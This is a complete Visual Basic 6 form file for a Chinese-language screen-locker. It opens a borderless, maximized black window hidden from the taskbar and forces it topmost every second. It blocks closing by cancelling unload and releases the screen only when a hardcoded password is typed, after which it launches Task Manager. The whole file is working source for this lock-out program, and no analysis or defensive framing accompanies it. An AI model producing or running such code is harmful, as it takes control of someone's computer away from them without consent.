VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   9315
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   16020
   LinkTopic       =   "Form1"
   ScaleHeight     =   9315
   ScaleWidth      =   16020
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  '屏幕中心
   WindowState     =   2  'Maximized
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   9720
      Top             =   0
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   8175
      Left            =   600
      TabIndex        =   0
      Top             =   600
      Width           =   10575
      Begin VB.TextBox Text1 
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "宋体"
            Size            =   36
            Charset         =   134
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   975
         IMEMode         =   3  'DISABLE
         Left            =   1800
         PasswordChar    =   "*"
         TabIndex        =   4
         Top             =   5400
         Width           =   5415
      End
      Begin VB.Label Label5 
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "宋体"
            Size            =   21.75
            Charset         =   134
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   1095
         Left            =   7320
         TabIndex        =   6
         Top             =   5640
         Width           =   2895
      End
      Begin VB.Label Label4 
         BackColor       =   &H00000000&
         Caption         =   "输入密码以解锁"
         BeginProperty Font 
            Name            =   "宋体"
            Size            =   24
            Charset         =   134
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   615
         Left            =   2760
         TabIndex        =   5
         Top             =   4560
         Width           =   3855
      End
      Begin VB.Label Label3 
         BackColor       =   &H00000000&
         Caption         =   "OK"
         BeginProperty Font 
            Name            =   "宋体"
            Size            =   42
            Charset         =   134
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   855
         Left            =   4080
         TabIndex        =   3
         Top             =   6720
         Width           =   1335
      End
      Begin VB.Label Label2 
         BackColor       =   &H00000000&
         Caption         =   $"Form1.frx":0000
         BeginProperty Font 
            Name            =   "微软雅黑"
            Size            =   18
            Charset         =   134
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   2655
         Left            =   720
         TabIndex        =   2
         Top             =   240
         Width           =   8295
      End
      Begin VB.Label Label1 
         BackColor       =   &H00000000&
         Caption         =   "我已知晓"
         BeginProperty Font 
            Name            =   "宋体"
            Size            =   18
            Charset         =   134
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   495
         Left            =   3600
         TabIndex        =   1
         Top             =   2880
         Width           =   1935
      End
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   20000
      Left            =   8520
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function SetWindowPos& Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long)
  


Private Sub Command1_Click()
End

End Sub

Private Sub Form_Unload(Cancel As Integer)
Cancel = 1

End Sub

Private Sub Label1_MouseUp(Button As Integer, Shift As Integer, x As Single, Y As Single)
Label1.BorderStyle = 0

End Sub

Private Sub Label3_Click()
Dim x As String
x = Text1.Text
If Text1.Text = "" Then
Label5.Caption = "密码呢？被你吃了？"
ElseIf x = "2798986" Then
Shell "cmd /c" & "start taskmgr.exe"
End
Else
Label5.Caption = "密码不正确！！！"
End If


End Sub

Private Sub Label3_MouseDown(Button As Integer, Shift As Integer, x As Single, Y As Single)
Label3.BorderStyle = 1


End Sub

Private Sub Label3_MouseUp(Button As Integer, Shift As Integer, x As Single, Y As Single)
Label3.BorderStyle = 0

End Sub

Private Sub Timer2_Timer()
rtn = SetWindowPos(Me.hwnd, -1, 0, 0, 0, 0, 3)
End Sub

Private Sub Form_Load()
Timer1.Enabled = True
Timer2.Enabled = True
Timer2.Interval = 1000


End Sub

Private Sub Form_Resize()


Frame1.Left = (Me.Width - Frame1.Width) \ 2
Frame1.Top = (Me.Height - Frame1.Height) \ 2

End Sub

Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, x As Single, Y As Single)
Label1.BorderStyle = 1

End Sub

